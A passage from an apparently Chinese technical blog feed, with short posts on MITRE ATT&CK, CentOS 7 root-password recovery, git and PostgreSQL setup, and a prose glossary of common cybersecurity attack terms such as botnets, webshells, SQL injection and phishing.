        <content type="html"><![CDATA[<h1 id="Mitre-官方由抽象层次高低举例了三种网络攻击模型："><a href="#Mitre-官方由抽象层次高低举例了三种网络攻击模型：" class="headerlink" title="Mitre 官方由抽象层次高低举例了三种网络攻击模型："></a>Mitre 官方由抽象层次高低举例了三种网络攻击模型：</h1><p>高抽象模型：Lockheed Martin 的 Cyber Kill Chain 模型、Microsft 的 STRIDE 模型等<br>中抽象模型：Mitre 的 ATT&amp;CK 模型<br>低抽象模型：漏洞数据集、恶意软件数据集等</p><p>ATT&amp;CK 模型中有四个关键对象Tactics、Techniques、Groups 和 Software。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>centos7重置密码</title>
      <link href="/2022/03/26/centos7-chong-zhi-mi-ma/"/>
      <url>/2022/03/26/centos7-chong-zhi-mi-ma/</url>
      
        <content type="html"><![CDATA[<p><strong>操作步骤</strong></p><ol><li>重启操作系统  </li><li>当系统启动至引导界面，按任意键。然后将[光标]移动至待启动内核，按 e 编辑选中行。  </li><li>移动光标至 kernel command line（linux16 开头的行）  </li><li>移动至行末尾，增加 rd.break。  </li><li>按 Ctrl +x 启动系统</li><li>系统启动至 root shell 界面，此时，系统本身的 root 文件系统被以只读模式挂载到 &#x2F; sysroot 目录下  </li><li>以读写模式重新挂载 &#x2F; sysroot</li></ol><pre class="line-numbers language-none"><code class="language-none">switch_root:&#x2F;# mount -o remount,rw &#x2F;sysroot#检查&#x2F;sysroot是否以读写模式挂载switch_root:&#x2F;# mount | grep sysroot&#x2F;dev&#x2F;mapper&#x2F;centos-root on &#x2F;sysroot type xfs(rw,relatime,attr2,inode64,noquota)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li>执行 chroot 命令，将 &#x2F; sysroot 目录切换为根目录。<pre class="line-numbers language-none"><code class="language-none">switch_root:&#x2F;# chroot &#x2F;sysroot#chroot命令执行成功后，shell提示符将变为下述表示方法sh-4.2# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><blockquote><p>chroot jail 是什么？在 linux 操作系统中，默认的根目录都是‘&#x2F;’, 而 chroot 就是为改变正在运行的进程以及它的子进程的根目录而生。假设，某个程序的根目录从原先的默认的系统根目录‘&#x2F;’, 被你修改到 &#x2F; home 目录下，这个 &#x2F; home 目录就变成这个程序的逻辑根目录，那么，这个被修改了根目录环境的程序，就不能进入这个逻辑根目录以外的路径。本质上，这就是限制某个程序所能进入的目录树，所以，被称为 chroot 监狱。因此，这个程序的活动范围就从本来的整个系统 “&#x2F;“, 到后来的逻辑根 “&#x2F;home”。chroot(change root) 命令把根目录换成指定的目的目录。</p></blockquote><ol start="9"><li>创建一个新的密码  </li><li>根目录下创建. autorelabel 文件，确保在系统启动时，未标记的文件自动标记。</li></ol><pre class="line-numbers language-none"><code class="language-none">#针对已启用selinux的主机，该步骤的目的是重新生成文件的标记，必不可少。sh-4.2# touch &#x2F;.autorelabel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="11"><li>键入两次 exit，第一次退出 chroot 环境，第二次退出 initramfs 调试 shell，系统会自动重启。  </li><li>使用新密码正常登录。</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>git1</title>
      <link href="/2022/03/23/git1/"/>
      <url>/2022/03/23/git1/</url>
      
        <content type="html"><![CDATA[<h1 id="git显示中文乱码"><a href="#git显示中文乱码" class="headerlink" title="git显示中文乱码"></a>git显示中文乱码</h1><p>git status 查看改动发现中文乱码</p><pre class="line-numbers language-none"><code class="language-none">git config --global core.quotepath false加上后在git配置文件.gitconfig会出现[core]        quotepath &#x3D; false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>postgresql</title>
      <link href="/2022/03/22/postgresql/"/>
      <url>/2022/03/22/postgresql/</url>
      
        <content type="html"><![CDATA[<p>初次安装后，默认生成一个名为postgres的数据库和一个名为postgres的数据库用户。这里需要注意的是，同时还生成了一个名为postgres的Linux系统用户。这时相当于系统用户postgres以同名数据库用户的身份，登录数据库，这是不用输入密码的。如果一切正常，系统提示符会变为”postgres&#x3D;#”，表示这时已经进入了数据库控制台。以下的命令都在控制台内完成。<br>切换到postgres</p><pre class="line-numbers language-none"><code class="language-none">su - postgrespsql <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>使用\password命令，为postgres用户设置一个密码。<pre class="line-numbers language-none"><code class="language-none">\password  mima<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>创建数据库用户dbuser（刚才创建的是Linux系统用户），并设置密码。<pre class="line-numbers language-none"><code class="language-none">CREATE USER dbuser WITH PASSWORD &#39;password&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>创建用户数据库，这里为exampledb，并指定所有者为dbuser。<pre class="line-numbers language-none"><code class="language-none">CREATE DATABASE exampledb OWNER dbuser;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>将exampledb数据库的所有权限都赋予dbuser，否则dbuser只能登录控制台，没有任何数据库操作权限。<pre class="line-numbers language-none"><code class="language-none">GRANT ALL PRIVILEGES ON DATABASE exampledb to dbuser;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>网络安全常见术语</title>
      <link href="/2022/03/21/wang-luo-an-quan-chang-jian-zhu-yu/"/>
      <url>/2022/03/21/wang-luo-an-quan-chang-jian-zhu-yu/</url>
      
        <content type="html"><![CDATA[<h1 id="一、攻击篇"><a href="#一、攻击篇" class="headerlink" title="一、攻击篇"></a>一、攻击篇</h1><h2 id="1．攻击工具"><a href="#1．攻击工具" class="headerlink" title="1．攻击工具"></a>1．攻击工具</h2><h3 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a>肉鸡</h3><p>所谓“肉鸡”是一种很形象的比喻，比喻那些可以被攻击者控制的电脑、手机、服务器或者其他摄像头、路由器等智能设备，用于发动网络攻击。 </p><p>例如在2016年美国东海岸断网事件中，黑客组织控制了大量的联网摄像头用于发动网络攻击，这些摄像头则可被称为“肉鸡”。</p><h3 id="僵尸网络"><a href="#僵尸网络" class="headerlink" title="僵尸网络"></a>僵尸网络</h3><p>僵尸网络 Botnet 是指采用一种或多种传播手段，将大量主机感染病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络。 </p><p>僵尸网络是一个非常形象的比喻，众多的计算机在不知不觉中如同中国古老传说中的僵尸群一样被人驱赶和指挥着，成为被攻击者执行各类恶意活动（DDOS、垃圾邮件等）利用的一种基础设施。</p><h3 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h3><p>就是那些表面上伪装成了正常的程序，但是当这些程序运行时，就会获取系统的整个控制权限。 </p><p>有很多黑客就是热衷使用木马程序来控制别人的电脑，比如灰鸽子、Gh0st、PcShare等等。</p><h3 id="网页木马"><a href="#网页木马" class="headerlink" title="网页木马"></a>网页木马</h3><p>表面上伪装成普通的网页或是将恶意代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马服务端植入到访问者的电脑上来自动执行将受影响的客户电脑变成肉鸡或纳入僵尸网络。</p><h3 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h3><p>Rootkit是攻击者用来隐藏自己的行踪和保留root（根权限，可以理解成WINDOWS下的system或者管理员权限）访问权限的工具。 </p><p>通常，攻击者通过远程攻击的方式获得root访问权限，或者是先使用密码猜解（破解）的方式获得对系统的普通访问权限，进入系统后，再通过对方系统存在的安全漏洞获得系统的root或system权限。 </p><p>然后，攻击者就会在对方的系统中安装Rootkit，以达到自己长久控制对方的目的，Rootkit功能上与木马和后门很类似，但远比它们要隐蔽。</p><h3 id="蠕虫病毒"><a href="#蠕虫病毒" class="headerlink" title="蠕虫病毒"></a>蠕虫病毒</h3><p>它是一类相对独立的恶意代码，利用了联网系统的开放性特点，通过可远程利用的漏洞自主地进行传播，受到控制终端会变成攻击的发起方，尝试感染更多的系统。 </p><p>蠕虫病毒的主要特性有：自我复制能力、很强的传播性、潜伏性、特定的触发性、很大的破坏性。</p><h3 id="震网病毒"><a href="#震网病毒" class="headerlink" title="震网病毒"></a>震网病毒</h3><p>又名Stuxnet病毒，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。 </p><p>作为世界上首个网络“超级破坏性武器”，Stuxnet的计算机病毒已经感染了全球超过 45000个网络，其目标伊朗的铀浓缩设备遭到的攻击最为严重。</p><h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><p>主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。</p><h3 id="挖矿木马"><a href="#挖矿木马" class="headerlink" title="挖矿木马"></a>挖矿木马</h3><p>一种将PC、移动设备甚至服务器变为矿机的木马，通常由挖矿团伙植入，用于挖掘比特币从而赚取利益。</p><h3 id="攻击载荷"><a href="#攻击载荷" class="headerlink" title="攻击载荷"></a>攻击载荷</h3><p>攻击载荷（Payload）是系统被攻陷后执行的多阶段恶意代码。 </p><p>通常攻击载荷附加于漏洞攻击模块之上，随漏洞攻击一起分发，并可能通过网络获取更多的组件。</p><h3 id="嗅探器（Sniffer）"><a href="#嗅探器（Sniffer）" class="headerlink" title="嗅探器（Sniffer）"></a>嗅探器（Sniffer）</h3><p>就是能够捕获网络报文的设备或程序。嗅探器的正当用处在于分析网络的流量，以便找出所关心的网络中潜在的问题。</p><h3 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h3><p>被设计来达到非授权控制计算机或窃取计算机数据等多种恶意行为的程序。</p><h3 id="间谍软件"><a href="#间谍软件" class="headerlink" title="间谍软件"></a>间谍软件</h3><p>一种能够在用户不知情的情况下，在其电脑、手机上安装后门，具备收集用户信息、监听、偷拍等功能的软件。</p><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>这是一种形象的比喻，入侵者在利用某些方法成功的控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置，用于访问、查看或者控制这台主机。 </p><p>这些改动表面上是很难被察觉的，就好象是入侵者偷偷的配了一把主人房间的钥匙，或者在不起眼处修了一条暗道，可以方便自身随意进出。 </p><p>通常大多数木马程序都可以被入侵者用于创建后门（BackDoor）。</p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>指那些强度不够，容易被猜解的，类似123，abc这样的口令（密码）。</p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。 奇安信集团董事长齐向东在《漏洞》一书中指出，软件的缺陷是漏洞的一个主要来源，缺陷是天生的，漏洞是不可避免的。</p><h3 id="远程命令执行漏洞"><a href="#远程命令执行漏洞" class="headerlink" title="远程命令执行漏洞"></a>远程命令执行漏洞</h3><p>由于系统设计实现上存在的漏洞，攻击者可能通过发送特定的请求或数据导致在受影响的系统上执行攻击者指定的任意命令。</p><h3 id="0day漏洞"><a href="#0day漏洞" class="headerlink" title="0day漏洞"></a>0day漏洞</h3><p>0day漏洞最早的破解是专门针对软件的，叫做WAREZ，后来才发展到游戏，音乐，影视等其他内容的。 </p><p>0day中的0表示Zero，早期的0day表示在软件发行后的24小时内就出现破解版本。 </p><p>在网络攻防的语境下，0day漏洞指那些已经被攻击者发现掌握并开始利用，但还没有被包括受影响软件厂商在内的公众所知的漏洞，这类漏洞对攻击者来说有完全的信息优势，由于没有漏洞的对应的补丁或临时解决方案，防守方不知道如何防御，攻击者可以达成最大可能的威胁。</p><h3 id="1day漏洞"><a href="#1day漏洞" class="headerlink" title="1day漏洞"></a>1day漏洞</h3><p>指漏洞信息已公开但仍未发布补丁的漏洞。此类漏洞的危害仍然较高，但往往官方会公布部分缓解措施，如关闭部分端口或者服务等。</p><h3 id="Nday漏洞"><a href="#Nday漏洞" class="headerlink" title="Nday漏洞"></a>Nday漏洞</h3><p>指已经发布官方补丁的漏洞。通常情况下，此类漏洞的防护只需更新补丁即可，但由于多种原因，导致往往存在大量设备漏洞补丁更新不及时，且漏洞利用方式已经在互联网公开，往往此类漏洞是黑客最常使用的漏洞。 </p><p>例如在永恒之蓝事件中，微软事先已经发布补丁，但仍有大量用户中招。 </p><h2 id="2．攻击方法"><a href="#2．攻击方法" class="headerlink" title="2．攻击方法"></a>2．攻击方法</h2><h3 id="挂马"><a href="#挂马" class="headerlink" title="挂马"></a>挂马</h3><p>就是在别人的网站文件里面放入网页木马或者是将代码潜入到对方正常的网页文件里，以使浏览者中马。</p><h3 id="挖洞"><a href="#挖洞" class="headerlink" title="挖洞"></a>挖洞</h3><p>指漏洞挖掘。</p><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><p>就是利用特殊的算法，将EXE可执行程序或者DLL动态连接库文件的编码进行改变（比如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。 </p><p>目前较常用的壳有UPX，ASPack、PePack、PECompact、UPack、免疫007、木马彩衣等等。</p><h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>简单的解释就是程序对输入数据没有执行有效的边界检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令。</p><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><p>攻击者向一个地址区输入这个区间存储不下的大量字符。在某些情况下，这些多余的字符可以作为“执行代码”来运行，因此足以使攻击者不受安全措施限制而获得计算机的控制权。</p><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>Web安全头号大敌。攻击者把一些包含攻击代码当做命令或者查询语句发送给解释器，这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据。 </p><p>注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的。注入漏洞通常能在SQL查询、LDAP查询、OS命令、程序参数等中出现。</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>注入攻击最常见的形式，主要是指Web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询或其他操作，导致数据库信息泄露或非授权操作数据表。</p><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p>即可以实行注入的地方，通常是一个涉及访问数据库的应用链接。根据注入点数据库的运行帐号的权限的不同，你所得到的权限也不同。</p><h3 id="软件脱壳"><a href="#软件脱壳" class="headerlink" title="软件脱壳"></a>软件脱壳</h3><p>顾名思义，就是利用相应的工具，把在软件“外面”起保护作用的“壳”程序去除，还文件本来面目，这样再修改文件内容或进行分析检测就容易多了。</p><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><p>就是通过加壳、加密、修改特征码、加花指令等等技术来修改程序，使其逃过杀毒软件的查杀。</p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>简称“爆破”。黑客对系统中账号的每一个可能的密码进行高度密集的自动搜索，从而破坏安全并获得对计算机的访问权限。</p><h3 id="洪水攻击"><a href="#洪水攻击" class="headerlink" title="洪水攻击"></a>洪水攻击</h3><p>是黑客比较常用的一种攻击技术，特点是实施简单，威力巨大，大多是无视防御的。 </p><p>从定义上说，攻击者对网络资源发送过量数据时就发生了洪水攻击，这个网络资源可以是router，switch，host，application等。 </p><p>洪水攻击将攻击流量比作成洪水，只要攻击流量足够大，就可以将防御手段打穿。 </p><p>DDoS攻击便是洪水攻击的一种。</p><h3 id="SYN攻击"><a href="#SYN攻击" class="headerlink" title="SYN攻击"></a>SYN攻击</h3><p>利用操作系统TCP协调设计上的问题执行的拒绝服务攻击，涉及TCP建立连接时三次握手的设计。</p><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h3><p>拒绝服务攻击。攻击者通过利用漏洞或发送大量的请求导致攻击对象无法访问网络或者网站无法被访问。</p><h3 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h3><p>分布式DOS攻击，常见的UDP、SYN、反射放大攻击等等，就是通过许多台肉鸡一起向你发送一些网络请求信息，导致你的网络堵塞而不能正常上网。</p><h4 id="抓鸡"><a href="#抓鸡" class="headerlink" title="抓鸡"></a>抓鸡</h4><p>即设法控制电脑，将其沦为肉鸡。</p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>端口扫描是指发送一组端口扫描消息，通过它了解到从哪里可探寻到攻击弱点，并了解其提供的计算机网络服务类型，试图以此侵入某台计算机。</p><h4 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h4><p>通过加入不影响程序功能的多余汇编指令，使得杀毒软件不能正常的判断病毒文件的构造。说通俗点就是“杀毒软件是从头到脚按顺序来识别病毒。如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了”。</p><h3 id="反弹端口"><a href="#反弹端口" class="headerlink" title="反弹端口"></a>反弹端口</h3><p>有人发现，防火墙对于连入的连接往往会进行非常严格的过滤，但是对于连出的连接却疏于防范。 </p><p>于是，利用这一特性，反弹端口型软件的服务端(被控制端)会主动连接客户端(控制端)，就给人“被控制端主动连接控制端的假象，让人麻痹大意。</p><h3 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h3><p>攻击者利用欺骗性的电子邮件或伪造的 Web 站点等来进行网络诈骗活动。 </p><p>诈骗者通常会将自己伪装成网络银行、在线零售商和信用卡公司等可信的品牌，骗取用户的私人信息或邮件账号口令。 </p><p>受骗者往往会泄露自己的邮箱、私人资料，如信用卡号、银行卡账户、身份证号等内容。</p><h3 id="鱼叉攻击"><a href="#鱼叉攻击" class="headerlink" title="鱼叉攻击"></a>鱼叉攻击</h3><p>鱼叉攻击是将用鱼叉捕鱼形象的引入到了网络攻击中，主要是指可以使欺骗性电子邮件看起来更加可信的网络钓鱼攻击，具有更高的成功可能性。 </p><p>不同于撒网式的网络钓鱼，鱼叉攻击往往更加具备针对性，攻击者往往“见鱼而使叉”。 </p><p>为了实现这一目标，攻击者将尝试在目标上收集尽可能多的信息。通常，组织内的特定个人存在某些安全漏洞。</p><h3 id="钓鲸攻击"><a href="#钓鲸攻击" class="headerlink" title="钓鲸攻击"></a>钓鲸攻击</h3><p>捕鲸是另一种进化形式的鱼叉式网络钓鱼。它指的是针对高级管理人员和组织内其他高级人员的网络钓鱼攻击。 </p><p>通过使电子邮件内容具有个性化并专门针对相关目标进行定制的攻击。</p><h3 id="水坑攻击"><a href="#水坑攻击" class="headerlink" title="水坑攻击"></a>水坑攻击</h3><p>顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。 </p><p>最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。</p><h3 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h3><p>嗅探指的是对局域网中的数据包进行截取及分析，从中获取有效信息。</p><h3 id="APT攻击"><a href="#APT攻击" class="headerlink" title="APT攻击"></a>APT攻击</h3><p>Advanced Persistent Threat，即高级可持续威胁攻击，指某组织在网络上对特定对象展开的持续有效的攻击活动。 </p><p>这种攻击活动具有极强的隐蔽性和针对性，通常会运用受感染的各种介质、供应链和社会工程学等多种手段实施先进的、持久的且有效的威胁和攻击。</p><h3 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h3><p>C2 全称为Command and Control，命令与控制，常见于APT攻击场景中。作动词解释时理解为恶意软件与攻击者进行交互，作名词解释时理解为攻击者的“基础设施”。</p><h3 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a>供应链攻击</h3><p>是黑客攻击目标机构的合作伙伴，并以该合作伙为跳板，达到渗透目标用户的目的。 </p><p>一种常见的表现形式为，用户对厂商产品的信任，在厂商产品下载安装或者更新时进行恶意软件植入进行攻击。 </p><p>所以，在某些软件下载平台下载的时候，若遭遇捆绑软件，就得小心了！</p><h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。 </p><p>通俗而言是指利用人的社会学弱点实施网络攻击的一整套方法论，其攻击手法往往出乎人意料。 </p><p>世界第一黑客凯文·米特尼克在《反欺骗的艺术》中曾提到，人为因素才是安全的软肋。很多企业、公司在信息安全上投入大量的资金，最终导致数据泄露的原因，往往却是发生在人本身。</p><h3 id="拿站"><a href="#拿站" class="headerlink" title="拿站"></a>拿站</h3><p>指得到一个网站的最高权限，即得到后台和管理员名字和密码。</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>指得到你本没得到的权限，比如说电脑中非系统管理员就无法访问一些C盘的东西，而系统管理员就可以，通过一定的手段让普通用户提升成为管理员，让其拥有管理员的权限，这就叫提权。</p><h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>就是通过扫描检测你的网络设备及系统有没有安全漏洞，有的话就可能被入侵，就像一滴水透过一块有漏洞的木板，渗透成功就是系统被入侵。</p><h3 id="横移"><a href="#横移" class="headerlink" title="横移"></a>横移</h3><p>指攻击者入侵后，从立足点在内部网络进行拓展，搜寻控制更多的系统。</p><h3 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h3><p>一个具有辅助作用的机器，利用这个主机作为一个间接工具，来入侵其他主机，一般和肉鸡连用。</p><h3 id="网马"><a href="#网马" class="headerlink" title="网马"></a>网马</h3><p>就是在网页中植入木马，当打开网页的时候就运行了木马程序。</p><h3 id="黑页"><a href="#黑页" class="headerlink" title="黑页"></a>黑页</h3><p>黑客攻击成功后，在网站上留下的黑客入侵成功的页面，用于炫耀攻击成果。</p><h3 id="暗链"><a href="#暗链" class="headerlink" title="暗链"></a>暗链</h3><p>看不见的网站链接，“暗链”在网站中的链接做得非常隐蔽，短时间内不易被搜索引擎察觉。 </p><p>它和友情链接有相似之处，可以有效地提高网站权重。</p><h3 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h3><p>拖库本来是数据库领域的术语，指从数据库中导出数据。 </p><p>在网络攻击领域，它被用来指网站遭到入侵后，黑客窃取其数据库文件。</p><h3 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h3><p>撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。 </p><p>很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击。</p><h3 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h3><p>入侵网站的一种手法，通过恶意代码让网站爆出其一些敏感数据来。</p><h3 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC攻击</h3><p>即Challenge Collapsar，名字来源于对抗国内安全厂商绿盟科技早期的抗拒绝服务产品黑洞，攻击者借助代理服务器生成指向受害主机的涉及大量占用系统资源的合法请求，耗尽目标的处理资源，达到拒绝服务的目的。</p><h3 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h3><p>Webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做是一种网页后门，可以上传下载文件，查看数据库，执行任意程序命令等。</p><h3 id="跨站攻击"><a href="#跨站攻击" class="headerlink" title="跨站攻击"></a>跨站攻击</h3><p>通常简称为XSS，是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。</p><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>中间人攻击是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而这台计算机就称为“中间人”。</p><h3 id="薅羊毛"><a href="#薅羊毛" class="headerlink" title="薅羊毛"></a>薅羊毛</h3><p>指网赚一族利用各种网络金融产品或红包活动推广下线抽成赚钱，又泛指搜集各个银行等金融机构及各类商家的优惠信息，以此实现盈利的目的。这类行为就被称之为薅羊毛。</p><h3 id="商业电子邮件攻击（BEC）"><a href="#商业电子邮件攻击（BEC）" class="headerlink" title="商业电子邮件攻击（BEC）"></a>商业电子邮件攻击（BEC）</h3><p>也被称为“变脸诈骗”攻击，这是针对高层管理人员的攻击，攻击者通常冒充（盗用）决策者的邮件，来下达与资金、利益相关的指令；或者攻击者依赖社会工程学制作电子邮件，说服&#x2F;诱导高管短时间进行经济交易。</p><h3 id="电信诈骗"><a href="#电信诈骗" class="headerlink" title="电信诈骗"></a>电信诈骗</h3><p>是指通过电话、网络和短信方式，编造虚假信息，设置骗局，对受害人实施远程、非接触式诈骗，诱使受害人打款或转账的犯罪行为，通常以冒充他人及仿冒、伪造各种合法外衣和形式的方式达到欺骗的目的。</p><h3 id="杀猪盘"><a href="#杀猪盘" class="headerlink" title="杀猪盘"></a>杀猪盘</h3><p>网络流行词，电信诈骗的一种，是一种网络交友诱导股票投资、赌博等类型的诈骗方式，“杀猪盘”则是“从业者们”自己起的名字，是指放长线“养猪”诈骗，养得越久，诈骗得越狠。</p><h3 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h3><p>ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。 </p><p>基于ARP协议的这一工作特性，黑客向对方计算机不断发送有欺诈性质的ARP数据包，数据包内包含有与当前设备重复的Mac地址，使对方在回应报文时，由于简单的地址重复错误而导致不能进行正常的网络通信。</p><h3 id="欺骗攻击"><a href="#欺骗攻击" class="headerlink" title="欺骗攻击"></a>欺骗攻击</h3><p>网络欺骗的技术主要有：HONEYPOT和分布式HONEYPOT、欺骗空间技术等。 </p><p>主要方式有：IP欺骗、ARP欺骗、 DNS欺骗、Web欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等。</p><h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><p>一段可被操作系统无需特别定位处理的指令，通常在利用软件漏洞后执行的恶意代码，shellcode为二进制的机器码，因为经常让攻击者获得shell而得名。</p><h3 id="物理攻击"><a href="#物理攻击" class="headerlink" title="物理攻击"></a>物理攻击</h3><p>通俗理解，即采用物理接触而非技术手段达到网络入侵的目的，最常见的表现形式为插U盘。 </p><p>著名的震网病毒事件即通过插U盘的形式，感染了伊朗核设施。</p><p> </p><h2 id="3．攻击者"><a href="#3．攻击者" class="headerlink" title="3．攻击者"></a>3．攻击者</h2><h3 id="黑产"><a href="#黑产" class="headerlink" title="黑产"></a>黑产</h3><p>网络黑产，指以互联网为媒介，以网络技术为主要手段，为计算机信息系统安全和网络空间管理秩序，甚至国家安全、社会政治稳定带来潜在威胁（重大安全隐患）的非法行为。 </p><p>例如非法数据交易产业。</p><h3 id="暗网"><a href="#暗网" class="headerlink" title="暗网"></a>暗网</h3><p>暗网是利用加密传输、P2P对等网络、多点中继混淆等，为用户提供匿名的互联网信息访问的一类技术手段，其最突出的特点就是匿名性。</p><h3 id="黑帽黑客"><a href="#黑帽黑客" class="headerlink" title="黑帽黑客"></a>黑帽黑客</h3><p>以非法目的进行黑客攻击的人，通常是为了经济利益。他们进入安全网络以销毁、赎回、修改或窃取数据，或使网络无法用于授权用户。 </p><p>这个名字来源于这样一个历史：老式的黑白西部电影中，恶棍很容易被电影观众识别，因为他们戴着黑帽子，而“好人”则戴着白帽子。</p><h3 id="白帽黑客"><a href="#白帽黑客" class="headerlink" title="白帽黑客"></a>白帽黑客</h3><p>是那些用自己的黑客技术来进行合法的安全测试分析的黑客，测试网络和系统的性能来判定它们能够承受入侵的强弱程度。</p><h3 id="红帽黑客"><a href="#红帽黑客" class="headerlink" title="红帽黑客"></a>红帽黑客</h3><p>事实上最为人所接受的说法叫红客。 </p><p>红帽黑客以正义、道德、进步、强大为宗旨，以热爱祖国、坚持正义、开拓进取为精神支柱，红客通常会利用自己掌握的技术去维护国内网络的安全，并对外来的进攻进行还击。</p><h3 id="红队"><a href="#红队" class="headerlink" title="红队"></a>红队</h3><p>通常指攻防演习中的攻击队伍。</p><h3 id="蓝队"><a href="#蓝队" class="headerlink" title="蓝队"></a>蓝队</h3><p>通常指攻防演习中的防守队伍。</p><h3 id="紫队"><a href="#紫队" class="headerlink" title="紫队"></a>紫队</h3><p>攻防演习中新近诞生的一方，通常指监理方或者裁判方。</p><h1 id="二、防守篇"><a href="#二、防守篇" class="headerlink" title="二、防守篇"></a>二、防守篇</h1><h2 id="1．软硬件"><a href="#1．软硬件" class="headerlink" 